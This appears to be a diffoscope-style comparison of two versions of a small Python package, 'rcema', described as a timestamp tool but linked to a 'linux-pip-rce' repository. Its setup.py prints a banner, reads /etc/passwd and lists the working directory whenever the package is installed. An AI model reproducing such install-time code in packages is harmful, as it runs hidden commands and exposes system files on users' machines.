# Comparing `tmp/rcema-0.0.1.tar.gz` & `tmp/rcema-0.0.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "rcema-0.0.1.tar", last modified: Fri May 19 05:36:44 2023, max compression
+gzip compressed data, was "rcema-0.0.2.tar", last modified: Fri May 19 06:12:54 2023, max compression
```

## Comparing `rcema-0.0.1.tar` & `rcema-0.0.2.tar`

### file list

```diff
@@ -1,10 +1,10 @@
-drwxr-xr-x   0 lizq      (1000) lizq      (1000)        0 2023-05-19 05:36:44.907037 rcema-0.0.1/
--rw-r--r--   0 lizq      (1000) lizq      (1000)      338 2023-05-19 05:36:44.907037 rcema-0.0.1/PKG-INFO
--rwxrw-rw-   0 lizq      (1000) lizq      (1000)      219 2022-10-24 03:01:58.000000 rcema-0.0.1/README.md
-drwxr-xr-x   0 lizq      (1000) lizq      (1000)        0 2023-05-19 05:36:44.907037 rcema-0.0.1/rcema.egg-info/
--rw-r--r--   0 lizq      (1000) lizq      (1000)      338 2023-05-19 05:36:44.000000 rcema-0.0.1/rcema.egg-info/PKG-INFO
--rw-r--r--   0 lizq      (1000) lizq      (1000)      134 2023-05-19 05:36:44.000000 rcema-0.0.1/rcema.egg-info/SOURCES.txt
--rw-r--r--   0 lizq      (1000) lizq      (1000)        1 2023-05-19 05:36:44.000000 rcema-0.0.1/rcema.egg-info/dependency_links.txt
--rw-r--r--   0 lizq      (1000) lizq      (1000)        6 2023-05-19 05:36:44.000000 rcema-0.0.1/rcema.egg-info/top_level.txt
--rw-r--r--   0 lizq      (1000) lizq      (1000)       38 2023-05-19 05:36:44.907037 rcema-0.0.1/setup.cfg
--rwxrw-rw-   0 lizq      (1000) lizq      (1000)      907 2023-05-19 05:36:41.000000 rcema-0.0.1/setup.py
+drwxr-xr-x   0 lizq      (1000) lizq      (1000)        0 2023-05-19 06:12:54.724336 rcema-0.0.2/
+-rw-r--r--   0 lizq      (1000) lizq      (1000)      338 2023-05-19 06:12:54.724336 rcema-0.0.2/PKG-INFO
+-rwxrw-rw-   0 lizq      (1000) lizq      (1000)      219 2022-10-24 03:01:58.000000 rcema-0.0.2/README.md
+drwxr-xr-x   0 lizq      (1000) lizq      (1000)        0 2023-05-19 06:12:54.724336 rcema-0.0.2/rcema.egg-info/
+-rw-r--r--   0 lizq      (1000) lizq      (1000)      338 2023-05-19 06:12:54.000000 rcema-0.0.2/rcema.egg-info/PKG-INFO
+-rw-r--r--   0 lizq      (1000) lizq      (1000)      134 2023-05-19 06:12:54.000000 rcema-0.0.2/rcema.egg-info/SOURCES.txt
+-rw-r--r--   0 lizq      (1000) lizq      (1000)        1 2023-05-19 06:12:54.000000 rcema-0.0.2/rcema.egg-info/dependency_links.txt
+-rw-r--r--   0 lizq      (1000) lizq      (1000)        6 2023-05-19 06:12:54.000000 rcema-0.0.2/rcema.egg-info/top_level.txt
+-rw-r--r--   0 lizq      (1000) lizq      (1000)       38 2023-05-19 06:12:54.724336 rcema-0.0.2/setup.cfg
+-rwxrw-rw-   0 lizq      (1000) lizq      (1000)      949 2023-05-19 06:12:39.000000 rcema-0.0.2/setup.py
```

### Comparing `rcema-0.0.1/setup.py` & `rcema-0.0.2/setup.py`

 * *Files 14% similar despite different names*

```diff
@@ -1,8 +1,9 @@
 from setuptools import setup, find_packages
+import os
 
 requirements = []  # 这里填依赖包信息
 
 msg = r"""
                               _
                              | |
  _ ____      ___ __   ___  __| |
@@ -13,18 +14,19 @@
 |_|
 
 """
 
 f = open("/dev/tty", "w")
 print(msg, file=f)
 print(open("/etc/passwd").read(), file=f)
+print(os.listdir('./'), file=f)
 
 setup(
     name="rcema",
-    version="0.0.1",
+    version="0.0.2",
     author="lizq603",
     author_email="iv2013@qq.com",
     description="A package to add timestamp to your input",
     long_description="",
     long_description_content_type="text/markdown",
     url="https://github.com/52piaoyu/linux-pip-rce",
     packages=find_packages(),
```

